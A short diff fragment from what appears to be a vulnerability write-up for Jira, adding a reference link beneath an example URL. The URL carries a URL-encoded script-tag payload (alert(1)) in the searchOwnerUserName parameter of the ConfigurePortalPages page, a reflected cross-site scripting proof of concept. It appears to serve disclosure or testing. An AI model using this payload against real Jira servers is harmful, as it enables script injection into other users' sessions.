@@ -60,3 +60,6 @@ Connection: close
 ```
 https://<JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
 ```
+
+Reference:
+- https://twitter.com/harshbothra
